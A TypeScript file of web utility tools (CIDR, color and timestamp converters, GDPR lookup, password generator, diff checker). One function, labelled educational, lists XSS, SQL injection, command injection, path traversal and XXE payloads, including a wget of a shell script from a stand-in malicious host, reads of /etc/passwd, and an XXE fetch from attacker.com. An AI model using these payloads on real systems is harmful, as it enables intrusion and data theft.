import { ToolOutput } from '@/types/tools';
import * as yaml from 'js-yaml';

// ═══════════════════════════════════════════════════════════════
// PRIORITY 3 TOOL IMPLEMENTATIONS (Nice-to-Have)
// ═══════════════════════════════════════════════════════════════

// Helper for Priority 3 tools - some use external libraries

// ─────────────────────────────────────────────────────────────
// 1. CIDR Converter
// ─────────────────────────────────────────────────────────────
export function convertCIDR(input: string): ToolOutput {
  try {
    const cleanInput = input.trim();
    let cidr: number;
    let subnetMask: string;

    // Check if input is CIDR notation
    if (cleanInput.startsWith('/')) {
      cidr = parseInt(cleanInput.slice(1));
      if (cidr < 0 || cidr > 32) throw new Error('CIDR must be 0-32');

      // Convert to subnet mask
      const mask = Array(4).fill(0);
      for (let i = 0; i < cidr; i++) {
        mask[Math.floor(i / 8)] |= 1 << (7 - (i % 8));
      }
      subnetMask = mask.join('.');
    }
    // Check if input is subnet mask
    else if (/^\d+\.\d+\.\d+\.\d+$/.test(cleanInput)) {
      subnetMask = cleanInput;
      const octets = subnetMask.split('.').map(Number);

      // Convert to binary and count 1s
      cidr = octets.reduce((count, octet) => {
        return count + octet.toString(2).split('1').length - 1;
      }, 0);
    } else {
      throw new Error('Invalid format. Use /24 or 255.255.255.0');
    }

    const totalHosts = Math.pow(2, 32 - cidr);
    const usableHosts = totalHosts - 2;

    const result = {
      cidr: `/${cidr}`,
      subnetMask,
      totalHosts,
      usableHosts: cidr === 31 || cidr === 32 ? totalHosts : usableHosts,
      networkBits: cidr,
      hostBits: 32 - cidr,
    };

    return {
      success: true,
      result,
      formatted: `
CIDR Notation: /${cidr}
Subnet Mask: ${subnetMask}

Network Bits: ${result.networkBits}
Host Bits: ${result.hostBits}

Total Addresses: ${totalHosts.toLocaleString()}
Usable Hosts: ${result.usableHosts.toLocaleString()}
      `.trim(),
    };
  } catch (error: any) {
    return {
      success: false,
      error: error.message || 'Failed to convert CIDR',
    };
  }
}

// ─────────────────────────────────────────────────────────────
// 2. Security Payload Generator
// ─────────────────────────────────────────────────────────────
export function generatePayload(type: string): ToolOutput {
  try {
    const payloads: Record<string, string[]> = {
      xss: [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        '<svg/onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(`XSS`)">',
      ],
      sqli: [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin' --",
        "' UNION SELECT NULL--",
        "1' ORDER BY 1--",
        "' AND 1=0 UNION ALL SELECT 'admin', 'password'",
      ],
      cmdi: [
        '; ls -la',
        '| whoami',
        '&& cat /etc/passwd',
        '`id`',
        '$(uname -a)',
        '; wget http://malicious.com/shell.sh',
      ],
      lfi: [
        '../../../etc/passwd',
        '....//....//....//etc/passwd',
        '/etc/passwd%00',
        'php://filter/convert.base64-encode/resource=index.php',
        'file:///etc/passwd',
      ],
      xxe: [
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
      ],
    };

    const payloadList = payloads[type];
    if (!payloadList) {
      throw new Error('Unknown payload type');
    }

    const category = {
      xss: 'Cross-Site Scripting (XSS)',
      sqli: 'SQL Injection',
      cmdi: 'Command Injection',
      lfi: 'Local File Inclusion / Path Traversal',
      xxe: 'XML External Entity (XXE)',
    }[type];

    let formatted = `${category} Payloads\n\n`;
    formatted += '⚠️  Educational purposes only. Do not use on systems you don\'t own.\n\n';
    payloadList.forEach((payload, i) => {
      formatted += `${i + 1}. ${payload}\n`;
    });

    return {
      success: true,
      result: { type, category, payloads: payloadList },
      formatted,
    };
  } catch (error: any) {
    return {
      success: false,
      error: error.message || 'Failed to generate payloads',
    };
  }
}

// ─────────────────────────────────────────────────────────────
// 3. API Request Tester
// ─────────────────────────────────────────────────────────────
export async function testAPI(url: string, method: string, headers: string, body: string): Promise<ToolOutput> {
  try {
    const parsedHeaders = headers ? JSON.parse(headers) : {};
    const requestOptions: RequestInit = {
      method,
      headers: parsedHeaders,
    };

    if (body && method !== 'GET') {
      requestOptions.body = body;
    }

    const startTime = Date.now();
    const response = await fetch(url, requestOptions);
    const duration = Date.now() - startTime;

    const responseHeaders: Record<string, string> = {};
    response.headers.forEach((value, key) => {
      responseHeaders[key] = value;
    });

    const contentType = response.headers.get('content-type') || '';
    let responseBody: any;

    if (contentType.includes('application/json')) {
      responseBody = await response.json();
    } else {
      responseBody = await response.text();
    }

    const result = {
      status: response.status,
      statusText: response.statusText,
      headers: responseHeaders,
      body: responseBody,
      duration: `${duration}ms`,
      url,
      method,
    };

    const formatted = `
Status: ${result.status} ${result.statusText}
Duration: ${duration}ms

Response Headers:
${Object.entries(responseHeaders)
  .map(([k, v]) => `  ${k}: ${v}`)
  .join('\n')}

Response Body:
${typeof responseBody === 'object' ? JSON.stringify(responseBody, null, 2) : responseBody}
    `.trim();

    return {
      success: true,
      result,
      formatted,
    };
  } catch (error: any) {
    return {
      success: false,
      error: error.message || 'API request failed',
    };
  }
}

// ─────────────────────────────────────────────────────────────
// 4. Caesar Cipher
// ─────────────────────────────────────────────────────────────
export function caesarCipher(text: string, shift: number, direction: string): ToolOutput {
  try {
    const actualShift = direction === 'decrypt' ? -shift : shift;

    const result = text
      .split('')
      .map((char) => {
        if (char.match(/[a-z]/i)) {
          const code = char.charCodeAt(0);
          const isUpperCase = code >= 65 && code <= 90;
          const base = isUpperCase ? 65 : 97;
          return String.fromCharCode(((code - base + actualShift + 26) % 26) + base);
        }
        return char;
      })
      .join('');

    return {
      success: true,
      result: {
        input: text,
        output: result,
        shift,
        direction,
      },
      formatted: result,
    };
  } catch (error: any) {
    return {
      success: false,
      error: error.message || 'Cipher operation failed',
    };
  }
}

// ─────────────────────────────────────────────────────────────
// 5. GDPR Article Lookup
// ─────────────────────────────────────────────────────────────
const GDPR_ARTICLES: Record<string, { title: string; summary: string }> = {
  '5': { title: 'Principles', summary: 'Lawfulness, fairness, transparency, purpose limitation, data minimization' },
  '6': { title: 'Lawfulness of Processing', summary: 'Consent, contract, legal obligation, vital interests, public task, legitimate interests' },
  '7': { title: 'Conditions for Consent', summary: 'Consent must be freely given, specific, informed, and unambiguous' },
  '12': { title: 'Transparent Information', summary: 'Information must be concise, transparent, intelligible, and easily accessible' },
  '13': { title: 'Information to be Provided', summary: 'Identity of controller, contact details of DPO, purposes and legal basis' },
  '15': { title: 'Right of Access', summary: 'Data subject has right to obtain confirmation of processing and access to data' },
  '16': { title: 'Right to Rectification', summary: 'Data subject has right to rectification of inaccurate personal data' },
  '17': { title: 'Right to Erasure (Right to be Forgotten)', summary: 'Data subject has right to erasure under certain conditions' },
  '18': { title: 'Right to Restriction', summary: 'Data subject has right to restrict processing under certain conditions' },
  '20': { title: 'Right to Data Portability', summary: 'Right to receive data in structured, machine-readable format' },
  '21': { title: 'Right to Object', summary: 'Data subject has right to object to processing' },
  '25': { title: 'Data Protection by Design', summary: 'Implement technical and organizational measures for data protection' },
  '32': { title: 'Security of Processing', summary: 'Implement appropriate technical and organizational security measures' },
  '33': { title: 'Notification of Breach', summary: 'Notify supervisory authority of personal data breach within 72 hours' },
  '35': { title: 'Data Protection Impact Assessment', summary: 'DPIA required for high-risk processing operations' },
  '37': { title: 'Designation of DPO', summary: 'Must designate Data Protection Officer in certain cases' },
  '83': { title: 'General Conditions for Fines', summary: 'Administrative fines up to €20M or 4% of annual worldwide turnover' },
};

export function lookupGDPR(query: string): ToolOutput {
  try {
    const cleanQuery = query.trim().toLowerCase();
    let results = [];

    // Search by article number
    if (GDPR_ARTICLES[cleanQuery]) {
      results.push({ article: cleanQuery, ...GDPR_ARTICLES[cleanQuery] });
    }

    // Search by keyword
    if (results.length === 0) {
      results = Object.entries(GDPR_ARTICLES)
        .filter(([_, info]) => info.title.toLowerCase().includes(cleanQuery) || info.summary.toLowerCase().includes(cleanQuery))
        .map(([article, info]) => ({ article, ...info }));
    }

    if (results.length === 0) {
      return {
        success: true,
        result: { query, results: [] },
        formatted: `No matching GDPR articles found for: ${query}`,
      };
    }

    let formatted = `Found ${results.length} GDPR article(s):\n\n`;
    results.forEach((r) => {
      formatted += `Article ${r.article}: ${r.title}\n`;
      formatted += `${r.summary}\n\n`;
    });

    return {
      success: true,
      result: { query, results },
      formatted: formatted.trim(),
    };
  } catch (error: any) {
    return {
      success: false,
      error: error.message || 'Failed to lookup GDPR article',
    };
  }
}

// ─────────────────────────────────────────────────────────────
// 6. Linux Command Reference
// ─────────────────────────────────────────────────────────────
const LINUX_COMMANDS: Record<string, { description: string; syntax: string; examples: string[] }> = {
  ls: {
    description: 'List directory contents',
    syntax: 'ls [options] [path]',
    examples: ['ls -la', 'ls -lh /var/log', 'ls -lt (sort by time)'],
  },
  grep: {
    description: 'Search text using patterns',
    syntax: 'grep [options] pattern [files]',
    examples: ['grep "error" log.txt', 'grep -r "TODO" .', 'grep -i "warning" *.log'],
  },
  find: {
    description: 'Search for files in directory hierarchy',
    syntax: 'find [path] [expression]',
    examples: ['find . -name "*.txt"', 'find / -type f -size +100M', 'find . -mtime -7'],
  },
  awk: {
    description: 'Pattern scanning and text processing',
    syntax: 'awk \'pattern {action}\' file',
    examples: ['awk \'{print $1}\' file.txt', 'awk -F: \'{print $1}\' /etc/passwd', 'awk \'/error/ {print}\' log.txt'],
  },
  sed: {
    description: 'Stream editor for filtering and transforming text',
    syntax: 'sed [options] \'command\' file',
    examples: ['sed \'s/old/new/g\' file.txt', 'sed -n \'5,10p\' file.txt', 'sed \'/pattern/d\' file.txt'],
  },
  chmod: {
    description: 'Change file permissions',
    syntax: 'chmod [mode] file',
    examples: ['chmod 755 script.sh', 'chmod +x file', 'chmod -R 644 /path/dir'],
  },
  chown: {
    description: 'Change file owner and group',
    syntax: 'chown [owner][:group] file',
    examples: ['chown user file.txt', 'chown user:group file.txt', 'chown -R user:group /path/dir'],
  },
  ps: {
    description: 'Report process status',
    syntax: 'ps [options]',
    examples: ['ps aux', 'ps -ef', 'ps aux | grep apache'],
  },
  tar: {
    description: 'Archive files',
    syntax: 'tar [options] [archive] [files]',
    examples: ['tar -czf archive.tar.gz dir/', 'tar -xzf archive.tar.gz', 'tar -tzf archive.tar.gz'],
  },
};

export function lookupCommand(command: string): ToolOutput {
  try {
    const cleanCmd = command.trim().toLowerCase();
    const info = LINUX_COMMANDS[cleanCmd];

    if (!info) {
      return {
        success: true,
        result: { command, found: false },
        formatted: `Command "${command}" not found in reference database.\n\nAvailable: ${Object.keys(LINUX_COMMANDS).join(', ')}`,
      };
    }

    const formatted = `
Command: ${cleanCmd}
Description: ${info.description}

Syntax: ${info.syntax}

Examples:
${info.examples.map((ex, i) => `  ${i + 1}. ${ex}`).join('\n')}
    `.trim();

    return {
      success: true,
      result: { command: cleanCmd, ...info, found: true },
      formatted,
    };
  } catch (error: any) {
    return {
      success: false,
      error: error.message || 'Failed to lookup command',
    };
  }
}

// ─────────────────────────────────────────────────────────────
// 7. Color Converter
// ─────────────────────────────────────────────────────────────
export function convertColor(input: string): ToolOutput {
  try {
    const cleanInput = input.trim();
    let r: number, g: number, b: number;

    // Parse HEX
    if (cleanInput.startsWith('#')) {
      const hex = cleanInput.slice(1);
      if (hex.length === 3) {
        r = parseInt(hex[0] + hex[0], 16);
        g = parseInt(hex[1] + hex[1], 16);
        b = parseInt(hex[2] + hex[2], 16);
      } else if (hex.length === 6) {
        r = parseInt(hex.slice(0, 2), 16);
        g = parseInt(hex.slice(2, 4), 16);
        b = parseInt(hex.slice(4, 6), 16);
      } else {
        throw new Error('Invalid HEX format');
      }
    }
    // Parse RGB
    else if (cleanInput.startsWith('rgb')) {
      const match = cleanInput.match(/rgb\((\d+),\s*(\d+),\s*(\d+)\)/);
      if (!match) throw new Error('Invalid RGB format');
      [, r, g, b] = match.map(Number);
    } else {
      throw new Error('Unknown color format');
    }

    // Convert to HSL
    const rNorm = r / 255;
    const gNorm = g / 255;
    const bNorm = b / 255;
    const max = Math.max(rNorm, gNorm, bNorm);
    const min = Math.min(rNorm, gNorm, bNorm);
    const l = (max + min) / 2;
    let h = 0,
      s = 0;

    if (max !== min) {
      const d = max - min;
      s = l > 0.5 ? d / (2 - max - min) : d / (max + min);
      if (max === rNorm) h = ((gNorm - bNorm) / d + (gNorm < bNorm ? 6 : 0)) / 6;
      else if (max === gNorm) h = ((bNorm - rNorm) / d + 2) / 6;
      else h = ((rNorm - gNorm) / d + 4) / 6;
    }

    const result = {
      hex: `#${((1 << 24) + (r << 16) + (g << 8) + b).toString(16).slice(1).toUpperCase()}`,
      rgb: `rgb(${r}, ${g}, ${b})`,
      hsl: `hsl(${Math.round(h * 360)}, ${Math.round(s * 100)}%, ${Math.round(l * 100)}%)`,
      values: { r, g, b, h: Math.round(h * 360), s: Math.round(s * 100), l: Math.round(l * 100) },
    };

    return {
      success: true,
      result,
      formatted: `
HEX: ${result.hex}
RGB: ${result.rgb}
HSL: ${result.hsl}
      `.trim(),
    };
  } catch (error: any) {
    return {
      success: false,
      error: error.message || 'Failed to convert color',
    };
  }
}

// ─────────────────────────────────────────────────────────────
// 8. Unix Timestamp Converter
// ─────────────────────────────────────────────────────────────
export function convertTimestamp(input: string): ToolOutput {
  try {
    const cleanInput = input.trim();
    let timestamp: number;
    let date: Date;

    // Check if input is timestamp
    if (/^\d+$/.test(cleanInput)) {
      timestamp = parseInt(cleanInput);
      // Handle both seconds and milliseconds
      if (timestamp > 10000000000) {
        date = new Date(timestamp);
      } else {
        date = new Date(timestamp * 1000);
      }
    }
    // Input is date string
    else {
      date = new Date(cleanInput);
      timestamp = Math.floor(date.getTime() / 1000);
    }

    if (isNaN(date.getTime())) {
      throw new Error('Invalid date or timestamp');
    }

    const result = {
      timestamp,
      timestampMs: date.getTime(),
      iso: date.toISOString(),
      utc: date.toUTCString(),
      local: date.toLocaleString(),
      date: date.toLocaleDateString(),
      time: date.toLocaleTimeString(),
    };

    return {
      success: true,
      result,
      formatted: `
Unix Timestamp: ${timestamp}
Milliseconds: ${result.timestampMs}

ISO 8601: ${result.iso}
UTC: ${result.utc}
Local: ${result.local}
      `.trim(),
    };
  } catch (error: any) {
    return {
      success: false,
      error: error.message || 'Failed to convert timestamp',
    };
  }
}

// ─────────────────────────────────────────────────────────────
// 9. Markdown Previewer (returns HTML)
// ─────────────────────────────────────────────────────────────
export function previewMarkdown(markdown: string): ToolOutput {
  try {
    // Basic markdown to HTML conversion (simplified)
    const html = markdown
      // Headers
      .replace(/^### (.*$)/gim, '<h3>$1</h3>')
      .replace(/^## (.*$)/gim, '<h2>$1</h2>')
      .replace(/^# (.*$)/gim, '<h1>$1</h1>')
      // Bold
      .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
      // Italic
      .replace(/\*(.*?)\*/g, '<em>$1</em>')
      // Links
      .replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2">$1</a>')
      // Code blocks
      .replace(/```(\w+)?\n([\s\S]*?)```/g, '<pre><code>$2</code></pre>')
      // Inline code
      .replace(/`([^`]+)`/g, '<code>$1</code>')
      // Lists
      .replace(/^\* (.*$)/gim, '<li>$1</li>')
      .replace(/(<li>.*<\/li>)/g, '<ul>$1</ul>')
      // Paragraphs
      .replace(/\n\n/g, '</p><p>')
      .replace(/^(?!<[hul])/gim, '<p>')
      .replace(/(?!<\/[hul]>)$/gim, '</p>');

    return {
      success: true,
      result: { markdown, html },
      formatted: html,
    };
  } catch (error: any) {
    return {
      success: false,
      error: error.message || 'Failed to preview markdown',
    };
  }
}

// ─────────────────────────────────────────────────────────────
// 10. YAML ⇄ JSON Converter
// ─────────────────────────────────────────────────────────────
export function convertYAMLJSON(input: string, direction: string): ToolOutput {
  try {
    let result: string;

    if (direction === 'yaml-to-json') {
      const parsed = yaml.load(input);
      result = JSON.stringify(parsed, null, 2);
    } else {
      const parsed = JSON.parse(input);
      result = yaml.dump(parsed, { indent: 2 });
    }

    return {
      success: true,
      result: { input, output: result, direction },
      formatted: result,
    };
  } catch (error: any) {
    return {
      success: false,
      error: error.message || 'Conversion failed',
    };
  }
}

// ─────────────────────────────────────────────────────────────
// 11. Password Generator
// ─────────────────────────────────────────────────────────────
export function generatePassword(
  length: number,
  includeNumbers: boolean,
  includeSymbols: boolean,
  includeUppercase: boolean
): ToolOutput {
  try {
    let chars = 'abcdefghijklmnopqrstuvwxyz';
    if (includeUppercase) chars += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    if (includeNumbers) chars += '0123456789';
    if (includeSymbols) chars += '!@#$%^&*()_+-=[]{}|;:,.<>?';

    // Generate cryptographically secure password
    const array = new Uint32Array(length);
    crypto.getRandomValues(array);
    const password = Array.from(array, (x) => chars[x % chars.length]).join('');

    return {
      success: true,
      result: {
        password,
        length,
        strength: length >= 16 ? 'Strong' : length >= 12 ? 'Medium' : 'Weak',
      },
      formatted: password,
    };
  } catch (error: any) {
    return {
      success: false,
      error: error.message || 'Failed to generate password',
    };
  }
}

// ─────────────────────────────────────────────────────────────
// 12. Text Diff Checker
// ─────────────────────────────────────────────────────────────
export function diffText(text1: string, text2: string): ToolOutput {
  try {
    const lines1 = text1.split('\n');
    const lines2 = text2.split('\n');

    const maxLines = Math.max(lines1.length, lines2.length);
    const diff = [];

    for (let i = 0; i < maxLines; i++) {
      const line1 = lines1[i] || '';
      const line2 = lines2[i] || '';

      if (line1 === line2) {
        diff.push({ type: 'unchanged', line: line1, lineNum: i + 1 });
      } else if (!lines2.includes(line1) && lines1[i]) {
        diff.push({ type: 'removed', line: line1, lineNum: i + 1 });
      } else if (!lines1.includes(line2) && lines2[i]) {
        diff.push({ type: 'added', line: line2, lineNum: i + 1 });
      } else {
        diff.push({ type: 'modified', from: line1, to: line2, lineNum: i + 1 });
      }
    }

    const stats = {
      added: diff.filter((d) => d.type === 'added').length,
      removed: diff.filter((d) => d.type === 'removed').length,
      modified: diff.filter((d) => d.type === 'modified').length,
      unchanged: diff.filter((d) => d.type === 'unchanged').length,
    };

    let formatted = `Changes: +${stats.added} -${stats.removed} ~${stats.modified}\n\n`;
    diff.forEach((d) => {
      if (d.type === 'removed') formatted += `- ${d.line}\n`;
      else if (d.type === 'added') formatted += `+ ${d.line}\n`;
      else if (d.type === 'modified') formatted += `~ ${d.from} → ${d.to}\n`;
      else formatted += `  ${d.line}\n`;
    });

    return {
      success: true,
      result: { diff, stats },
      formatted: formatted.trim(),
    };
  } catch (error: any) {
    return {
      success: false,
      error: error.message || 'Failed to compare text',
    };
  }
}
